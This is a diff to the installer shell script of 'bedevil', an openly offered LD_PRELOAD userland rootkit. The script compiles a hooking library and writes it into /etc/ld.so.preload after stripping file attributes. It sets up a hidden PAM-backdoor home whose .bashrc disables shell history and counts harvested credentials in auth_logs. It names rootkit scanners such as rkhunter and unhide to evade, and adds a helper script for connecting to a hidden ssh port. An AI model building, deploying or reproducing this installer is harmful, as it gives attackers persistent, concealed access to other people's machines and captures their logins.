@@ -13,6 +13,8 @@ LIBHOOKS="$NEW_MDIR/lib_hooks"
 XK='AC'
 PLATFORM="`uname -m`"
 
+CFILES=(".ascii" "etc/ssh.sh") # local static files to copy over to the install dir
+
 SINCLUDES="$MDIR/std_includes"
 MINCLUDES="$MDIR/module_includes"
 
@@ -23,10 +25,6 @@ IDIR="/lib/bedevil.$RANDOM"
 BD_ENV="`cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 8 | head -n 1`"
 LDSO_PRELOAD="/etc/ld.so.preload"
 
-LIBC_PATH="libc.so.6"
-LIBDL_PATH="libdl.so.1"
-LIBPAM_PATH="libpam.so.0"
-
 # later stores all of the kits hooks
 # see modules/lib_hooks
 declare -a array HOOKS=()
@@ -36,6 +34,7 @@ declare -a array HPROCS=("lsrootkit" "ldd" "unhide" "rkhunter" "chkproc" "chkdir
 
 if [ -f ".ascii" ]; then
     NICEASCII="`cat .ascii`"
+    clear # looks pretty. only clear if showing ascii
     printf "\e[1m\e[31m$NICEASCII\e[0m\n"
 fi
 
@@ -71,10 +70,7 @@ Usage: $0 [ -h | -v | -d | -f | -D | -c | -C | -i]
             prompted for input when needed.
 "
 
-show_help()
-{
-  echo "$HELPMSG"
-}
+show_help() { echo "$HELPMSG"; }
 
 verb() { [ $VERBOSE = 1 ] && echo " [VERBOSE] : $1"; }
 
@@ -131,7 +127,6 @@ glibhooks()
 
 ghookindexi()
 {
-    verb "doing thing"
     HOOKS=("$@")
     verb "\${HOOKS[*]}=${HOOKS[*]}"
 
@@ -161,6 +156,7 @@ ghookindexi()
 writechrs()
 {
     [ ! -d "$NEW_MDIR" ] && return
+    echo " [..] Building & writing C char arrays for the lib headers"
     spefhooks="$(glibhooks)"
     printf "${spefhooks//\\x/\\\\x}\n#endif" >> $CREDFILE
 }
@@ -192,6 +188,17 @@ start_config_wizard()
 
     # now that we know what placeholders are available, let's organise a list so we know exactly what placeholder we're
     # subbing a new variable for and when.
+    # the user, you, will be the one creating the list, really.
+
+    echo
+    echo " [..] Beginning the main user config wizard"
+    echo " [!] You will be prompted for input for each user variable in this rootkit."
+    echo " [!] All input prompts that you will be greeted with have random default values,"
+    echo "     which can be used by just pressing enter on the input."
+    echo " [!] You may want to change a couple of the default input settings (username/password),"
+    echo "     but you can leave a majority of the settings as their defaults."
+    echo
+
     for var in ${STR_VARS[*]}; do
         verb "'${FUNCNAME[0]}' - $var"
         unset REPLY
@@ -201,15 +208,10 @@ start_config_wizard()
         [[ "$var" == *"LDSO_PRELOAD"* ]] && RAND_VALUE=$LDSO_PRELOAD
         [[ "$var" == *"SOPATH"* ]] && RAND_VALUE="$IDIR/$BDVLSO.$PLATFORM" # this should run after (if) IDIR has been changed
 
-        [[ "$var" == *"LIBDL_PATH"* ]] && RAND_VALUE=$LIBDL_PATH
-        [[ "$var" == *"LIBC_PATH"* ]] && RAND_VALUE=$LIBC_PATH
-        [[ "$var" == *"LIBPAM_PATH"* ]] && RAND_VALUE=$LIBPAM_PATH
-
         read -p " [..] Variable input for ${var//\?} [$RAND_VALUE]: "
         if [ ! -z $REPLY ]; then
             if [[ "$var" == *"BD_PWD"* ]]; then
-              
-              PSETTINGS+="\"`xenc $(guserpwd $REPLY)`\":$var "
+                PSETTINGS+="\"`xenc $(guserpwd $REPLY)`\":$var "
                 continue
             fi
 
@@ -217,11 +219,6 @@ start_config_wizard()
             [[ "$var" == *"IDIR"* ]] && eval IDIR="$REPLY"
             [[ "$var" == *"BD_ENV"* ]] && eval BD_ENV="$REPLY"
             [[ "$var" == *"LDSO_PRELOAD"* ]] && eval LDSO_PRELOAD="$REPLY"
-
-
-            [[ "$var" == *"LIBDL_PATH"* ]] && eval LIBDL_PATH="$REPLY"
-            [[ "$var" == *"LIBC_PATH"* ]] && eval LIBC_PATH="$REPLY"
-            [[ "$var" == *"LIBPAM_PATH"* ]] && eval LIBPAM_PATH="$REPLY"
         else
             if [[ "$var" == *"BD_PWD"* ]]; then
               PSETTINGS+="\"`xenc $(guserpwd $RAND_VALUE)`\":$var "
@@ -246,6 +243,8 @@ start_config_wizard()
         fi
     done
 
+    printf "\n [+] Config wizard finished.\n\n"
+
     verb $PSETTINGS
 }
 
@@ -263,9 +262,8 @@ gather_user_settings()
         echo " [..] i.e. 'my_bedevil_settings.txt' OR 'http://google.com/my_bedevil_settings.txt'"
 
         unset REPLY
-        while [ -z $REPLY ]; do
-            read -p " [!] Enter the location of the file: "
-        done
+        while [ -z $REPLY ]; do read -p " [!] Enter the location of the file: "; done
+
         if [[ "$REPLY" == *"http://"* ]]; then # if 'http://' in reply
             PSETTINGS="`wget -qO- $REPLY`" || { echo " [!] Aborting '${FUNCNAME[0]}' - Could not download file."; return; }
         else # if reply is just regular text
@@ -281,15 +279,14 @@ gather_user_settings()
 c_includes()
 {
     _inc="`cat $SINCLUDES | grep -o '^[^#]*' && cat $MINCLUDES | grep -o '^[^#]*'`"
-    while read -r line; do
-        echo "#include $line" 
-    done <<< "$_inc"
+    while read -r line; do echo "#include $line"; done <<< "$_inc"
 }
 
 INT_VARS=()
 STR_VARS=()
 find_pholders()
 {
+	echo " [..] Finding variable placeholders"
     HDC=("$(find ./$MDIR/ -name '*.h' | xargs cat)")
     for w in $HDC; do
         CVAR=`echo $w | grep "??"`
@@ -310,7 +307,7 @@ find_pholders()
 overwrite_pholders()
 {
     CPHOLDER=$1
-    IFS=' ' read -a PSETTING <<< "$PSETTINGS"
+    IFS=' ' read -a PSETTING <<< "$PSETTINGS" # parse current placeholder setting
     for ps in ${PSETTING[@]}; do
         IFS=':' read -a cps <<< "$ps"
         cx=$(printf ''${cps[0]}'' )
@@ -332,35 +329,30 @@ populate_new_pholders()
             echo
             echo " [!] Overwriting '$NEW_MDIR'"
             rm -rf $NEW_MDIR
-        else # they do not want to overwrite the directory.
-            echo
+        else
+        	echo
             echo " [+] You did not want to overwrite '$NEW_MDIR'"
-            echo " [+] We will use the existing directory."
+            echo " [+] We will use the existing directory, with existing settings."
             return
         fi
     fi
 
+    echo " [..] Copying '$MDIR' to '$NEW_MDIR'"
     # copy module directory to new directory
-    cp -r $MDIR/ $NEW_MDIR/ || { echo " [!] Aborting '${FUNCNAME[0]}' - Couldn't copy module directory."; return; }
+	cp -r $MDIR/ $NEW_MDIR/ || { echo " [!] Aborting '${FUNCNAME[0]}' - Couldn't copy module directory."; return; }
 
-    # write all of of the required char array of xor'd names of symbols we're hooking
-    # this writes individual arrays for each different lib and also one array for /all/ hooks
-    writechrs
-
-    # module directory has been copied. now we get together all of our settings
+    writechrs # write char arrays
     gather_user_settings
 
+    echo " [..] Overwriting variable placeholders with new settings"
     # now PSETTINGS definitely exists, we can start parsing it for variables and replacing old placeholders
     PHEADERS=("$(find ./$NEW_MDIR/ -name '*.h')")
-    for h in $PHEADERS; do # go through every possible header
-        overwrite_pholders $h
-    done
-
-    echo " [+] New directory '$NEW_MDIR' has been created and populated with respective settings."
+    for h in $PHEADERS; do overwrite_pholders $h; done
 }
 
 cleanup_bdvl()
 {
+	echo " [+] Cleaning up local mess."
     [ -d $NEW_MDIR ] && rm -rf $NEW_MDIR
     [ -f $BDVLC ] && rm -f $BDVLC
     rm -f *.so.*
@@ -378,7 +370,7 @@ build_bdvlc()
 
 install_deps()
 {
-    echo " [+] Installing dependencies"
+    echo " [..] Installing dependencies."
     if [ -f /usr/bin/yum ]; then
         yum install -y -q -e 0 gcc pam-devel newt libgcc.i686 glibc-devel.i686 glibc-devel libpcap libpcap-devel vim-common &>/dev/null
     elif [ -f /usr/bin/apt-get ]; then
@@ -396,7 +388,7 @@ install_deps()
 compile_bdvl()
 {
     [ ! -d "$NEW_MDIR" ] && { echo " [!] '$NEW_MDIR' does not exist. Have you populated your new headers?"; exit; }
-    WARNING_FLAGS="-Wall -Wno-comment"
+    WARNING_FLAGS="-Wall -Wno-comment -Wno-nonnull-compare"
     OPTIMIZATION_FLAGS="-O0 -g0"
     OPTIONS="-fomit-frame-pointer -fPIC"
     LINKER_OPTIONS="-Wl,--build-id=none"
@@ -408,7 +400,7 @@ compile_bdvl()
     strip $BDVLSO.$PLATFORM || { echo " [!] Couldn't strip library. Exiting."; exit; }
     strip $BDVLSO.i686 &>/dev/null
 
-    echo " [+] bedevil shared library compiled and (presumably) is ready to be preloaded."
+    echo " [+] Shared library compiled."
     rm $BDVLC
 }
 
@@ -417,7 +409,8 @@ setup_home()
 {
     echo '. .bashrc' > "$1/.profile"
     LBASHRC="$1/.bashrc"
-    [ -f ".ascii" ] && cp .ascii $1/.ascii
+    mkdir $1/etc
+    for f in ${CFILES[*]}; do cp $f $1/$f; done # copy array of 'important' static files
     RBASHRC="tty -s || return
 [ ! -z \$TERM ] && export TERM=xterm
 unset HISTFILE SAVEHIST TMOUT PROMPT_COMMAND
@@ -428,13 +421,13 @@ clear
 alias ls='ls --color=auto'
 alias ll='ls --color=auto -AlFhn'
 
-[ -f .ascii ] && cat .ascii
+[ -f .ascii ] && printf \"\\e[1m\\e[31m\`cat .ascii\`\\e[0m\\n\"
 id
 [ ! -f ./auth_logs ] && touch auth_logs
-echo -e \"\\033[1mLogged account creds: \\033[1;31m\$(grep Username ~/auth_logs 2>/dev/null | wc -l)\\033[0m\""
+echo -e \"\\033[1mLogged accounts: \\033[1;31m\$(grep Username ~/auth_logs 2>/dev/null | wc -l)\\033[0m\""
     echo "$RBASHRC" > $LBASHRC
 
-    chown $MGID:$MGID $LDSO_PRELOAD $1 $1/* $1/.profile $1/.bashrc $1/.ascii
+    chown 0:$MGID $LDSO_PRELOAD $1 $1/* $1/.profile $1/.bashrc $1/.ascii
 }
 
 install_bdvl()
@@ -460,6 +453,8 @@ install_bdvl()
     echo ""
 
     populate_new_pholders # this will check, for us, if $NEW_MDIR exists or not, and will make it
+
+    echo " [..] Compiling the rootkit shared library."
     build_bdvlc # builds bdvl.c so we can compile the SO
     compile_bdvl # after this, bdvl.so.* will now exist in the cwd
 
@@ -476,20 +471,22 @@ install_bdvl()
     [ -f "$LDSO_PRELOAD" ] && chattr -ia $LDSO_PRELOAD &>/dev/null
     echo -n $SO_PATH > $LDSO_PRELOAD
     echo " [+] bedevil has been installed on the machine."
-    echo " [+] Cleaning up local mess."
     cleanup_bdvl
+    echo
 
     echo " [+] About to set up your home for the PAM backdoor."
     setup_home $IDIR
-    echo " [+] Your home is set up. All you need to do is log into your
-               backdoor via ssh with the credentials you specified during installation.
-               You may need to first restart the ssh service on this box."
+    echo " [+] Your home is set up. All you need to do is log into your"
+    echo "     backdoor via ssh with the credentials you specified during installation."
+    echo " [!] A script is available @ etc/ssh.sh which makes connecting to"
+    echo "     your hidden port that bit easier."
+    echo " [!] I recommend restarting this box's ssh service."
 }
 
 patch_libdl()
 {
     echo " [..] Patching dynamic linker libraries."
-    LDSO_PRELOAD="$(./plibdl.sh)" # change the variable to the new preload file location
+    LDSO_PRELOAD="$(etc/plibdl.sh $LDSO_PRELOAD)" # change the variable to the new preload file location
     echo " [+] Dynamic linker libs patched, new ld.so.preload location: $LDSO_PRELOAD"
 }
 
@@ -503,13 +500,15 @@ while getopts "h?vdfpcCbiD" opt; do
         show_help
         exit
         ;;
-    v)  echo " [+] Running in verbose mode."
+    v)
+		echo " [+] Running in verbose mode."
         VERBOSE=1
         ;;
     d)  
         populate_new_pholders
         ;;
-    f)  PRECONF_SETTINGS=1
+    f)
+		PRECONF_SETTINGS=1
         ;;
     p)  
         gather_user_settings
